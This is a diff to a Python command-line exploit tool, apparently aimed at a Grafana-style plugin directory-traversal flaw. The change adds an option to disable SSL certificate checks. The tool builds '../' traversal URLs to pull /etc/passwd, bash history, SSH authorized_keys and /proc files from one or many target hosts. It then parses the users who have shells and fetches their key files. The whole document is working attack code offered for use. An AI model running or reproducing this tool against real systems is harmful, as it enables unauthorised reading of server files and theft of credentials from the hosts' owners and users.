@@ -3,22 +3,23 @@ import urllib.request
 import argparse
 import os
 import urllib.error
+import ssl
 from colorama import Fore, Style, init
 
 init()
 
 banner = f"""
 {Fore.YELLOW}
-          ▓▓                                                                              
-       ▒▒▓▓▓▓▓▒▒▓                                                                         
-  ▓▓▓▓▓▓▓▒▒   ▒▒▓▓                              ▒█▒                 ▒            ▒        
-  ▒▓▓▓▓          ▒▓    ▒█████▒                 ▓█▒                  █▓           ▓▒  █    
-   ▓▓▓    ▓▓▓▓▓▓▒  ▒  ▓█        █████▒ ▒█████▒▒███ ▓▓   █▓ ▓████▓▒  █▓   ▒███▓  ▒█▓ ████  
-  ▒▓▓▓   ▓▒    ▒▓▓    █▒  ▒▓▓▓  █▓    ▓█    █▒ █▓   █▒  █▒ ▓█    █▒ █▓  ▓█   ▒█  █▓ ▒█    
-▒▓▓▓▓▓   ▓      ▓▓    █▓     █  █▒    █▓    █▒ █▓   ▒▒▓█▒▒ ▓▓    █▓ █▓  █▓    █▒ █▓ ▒█    
- ▒▒▓▓▓▒         ▓▓▓    ▓█▓▒▓██  █▒     █▓▒▒██▒ █▓  █▓   █▓ ▓█▓▒▒█▓  ▓█▒  █▓▒▓█▓  █▓  █▓▓▒ 
-     ▓▓▓▒▒    ▒▓▒▒        ▒              ▒▒                ▓▓ ▒▒      ▒    ▒          ▒▒  
-     ▒▒▒▒▒▒▒▒▒▒▒                                           ▒▒                             
+          ▓▓
+       ▒▒▓▓▓▓▓▒▒▓
+  ▓▓▓▓▓▓▓▒▒   ▒▒▓▓                              ▒█▒                 ▒            ▒
+  ▒▓▓▓▓          ▒▓    ▒█████▒                 ▓█▒                  █▓           ▓▒  █
+   ▓▓▓    ▓▓▓▓▓▓▒  ▒  ▓█        █████▒ ▒█████▒▒███ ▓▓   █▓ ▓████▓▒  █▓   ▒███▓  ▒█▓ ████
+  ▒▓▓▓   ▓▒    ▒▓▓    █▒  ▒▓▓▓  █▓    ▓█    █▒ █▓   █▒  █▒ ▓█    █▒ █▓  ▓█   ▒█  █▓ ▒█
+▒▓▓▓▓▓   ▓      ▓▓    █▓     █  █▒    █▓    █▒ █▓   ▒▒▓█▒▒ ▓▓    █▓ █▓  █▓    █▒ █▓ ▒█
+ ▒▒▓▓▓▒         ▓▓▓    ▓█▓▒▓██  █▒     █▓▒▒██▒ █▓  █▓   █▓ ▓█▓▒▒█▓  ▓█▒  █▓▒▓█▓  █▓  █▓▓▒
+     ▓▓▓▒▒    ▒▓▒▒        ▒              ▒▒                ▓▓ ▒▒      ▒    ▒          ▒▒
+     ▒▒▒▒▒▒▒▒▒▒▒                                           ▒▒
 
                                                                            version: 1.0.1
                                                                                 {Style.RESET_ALL}wezoom.ca{Style.RESET_ALL}
@@ -52,7 +53,6 @@ sensitive_paths = [
     "/root/.bash_history",
     "/root/.ssh/authorized_keys",
     "/home/{user}/.ssh/authorized_keys"
-    # "/var/lib/docker/containers/{container_id}/config.v2.json", Problems...!!!
 ]
 
 common_paths = [
@@ -95,13 +95,13 @@ common_paths = [
     "/proc/self/cmdline"
 ]
 
-def find_vulnerable_plugin(url, path, timeout=10):
+def find_vulnerable_plugin(url, path, timeout=10, context=None):
     if url.endswith('/'):
         url = url.rstrip('/')
     for plug in plugins:
         target_url = f"{url}/public/plugins/{plug}/../../../../../../../../../../../../../../../../../../..{path}"
         try:
-            response = urllib.request.urlopen(target_url, timeout=timeout)
+            response = urllib.request.urlopen(target_url, timeout=timeout, context=context)
             status_code = response.getcode()
             if status_code == 200:
                 print(f"{Fore.GREEN}[VULNERABLE] Plugin: {plug}{Style.RESET_ALL}")
@@ -110,17 +110,17 @@ def find_vulnerable_plugin(url, path, timeout=10):
             status_code = e.code if hasattr(e, 'code') else 'N/A'
             print(f"{Fore.RED}[-] Failed to download: {path} [status: {status_code}]{Style.RESET_ALL}")
             return None
-        except Exception as e:
+        except Exception:
             print(f"{Fore.RED}[-] Failed to download: {path} [status: N/A]{Style.RESET_ALL}")
     return None
 
-def exploit_vulnerability(url, path, plugin, output_dir, timeout=10):
+def exploit_vulnerability(url, path, plugin, output_dir, timeout=10, context=None):
     if url.endswith('/'):
         url = url.rstrip('/')
     host = url.split("//")[-1].split("/")[0].replace(":", "_")
     target_url = f"{url}/public/plugins/{plugin}/../../../../../../../../../../../../../../../../../../..{path}"
     try:
-        response = urllib.request.urlopen(target_url, timeout=timeout)
+        response = urllib.request.urlopen(target_url, timeout=timeout, context=context)
         status_code = response.getcode()
         if status_code == 200:
             content = response.read().decode()
@@ -137,7 +137,7 @@ def exploit_vulnerability(url, path, plugin, output_dir, timeout=10):
     except urllib.error.URLError as e:
         status_code = e.code if hasattr(e, 'code') else 'N/A'
         print(f"{Fore.RED}[-] Failed to download: {path} [status: {status_code}]{Style.RESET_ALL}")
-    except Exception as e:
+    except Exception:
         print(f"{Fore.RED}[-] Failed to download: {path} [status: N/A]{Style.RESET_ALL}")
 
 def extract_users_with_interactive_shells(passwd_content):
@@ -171,8 +171,14 @@ def main():
     parser.add_argument("-i", "--input-targets", help="Check multiple targets from a file in the format proto://ip:port", type=str)
     parser.add_argument("-o", "--output", help="Directory to download the file if found", type=str)
     parser.add_argument("-p", "--paths", help="File containing additional paths to check", default="common/paths.txt", type=str)
+    parser.add_argument("-k", "--ignore-ssl", help="Ignore SSL certificate verification", action='store_true')
 
     args = parser.parse_args()
+
+    # Create SSL context if ignoring SSL errors
+    context = None
+    if args.ignore_ssl:
+        context = ssl._create_unverified_context()
 
     if not os.path.exists(args.paths):
         print(f"{Fore.RED}[!] Paths file {args.paths} does not exist.{Style.RESET_ALL}")
@@ -195,13 +201,13 @@ def main():
             if path in tested_paths:
                 continue
             print(f"{Fore.YELLOW}[INFO] Checking path: {path}{Style.RESET_ALL}")
-            vulnerable_plugin = find_vulnerable_plugin(target, path)
+            vulnerable_plugin = find_vulnerable_plugin(target, path, context=context)
             if vulnerable_plugin:
-                exploit_vulnerability(target, path, vulnerable_plugin, args.output)
+                exploit_vulnerability(target, path, vulnerable_plugin, args.output, context=context)
                 tested_paths.add(path)
                 if path == "/etc/passwd":
-                    passwd_path = os.path.join(args.output, f"{target.split('//')[-1].split('/')[0].replace(':', '_')}_passwd")
-                    if os.path.exists(passwd_path):
+                    passwd_path = os.path.join(args.output, f"{target.split('//')[-1].split('/')[0].replace(':', '_')}_passwd") if args.output else None
+                    if passwd_path and os.path.exists(passwd_path):
                         passwd_content = open(passwd_path).read()
                     break
 
@@ -216,7 +222,7 @@ def main():
                     user_path = sensitive_path.replace("{user}", user)
                     if user_path in tested_paths:
                         continue
-                    exploit_vulnerability(target, user_path, vulnerable_plugin, args.output)
+                    exploit_vulnerability(target, user_path, vulnerable_plugin, args.output, context=context)
                     tested_paths.add(user_path)
 
         # Check additional paths
@@ -224,7 +230,7 @@ def main():
             if path in tested_paths:
                 continue
             print(f"{Fore.YELLOW}[INFO] Checking additional path: {path}{Style.RESET_ALL}")
-            exploit_vulnerability(target, path, vulnerable_plugin, args.output)
+            exploit_vulnerability(target, path, vulnerable_plugin, args.output, context=context)
             tested_paths.add(path)
 
     if args.target:
